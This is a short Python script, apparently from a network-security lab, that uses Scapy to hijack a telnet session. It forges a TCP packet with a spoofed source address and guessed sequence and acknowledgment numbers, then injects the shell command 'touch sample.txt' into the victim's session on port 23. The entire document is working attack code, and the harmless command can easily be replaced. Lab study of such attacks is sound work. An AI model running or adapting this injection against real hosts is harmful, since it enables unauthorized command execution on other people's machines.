from scapy.all import *

ip = IP(src = "10.10.10.102", dst = "10.10.10.186")

tcp = TCP(sport = 1051, dport = 23, flags = "A", seq = 54826191, ack = 1770823418)

data = "\ntouch sample.txt\n"

pkt = ip/tcp/data

ls(pkt)

send(pkt, verbose = 0)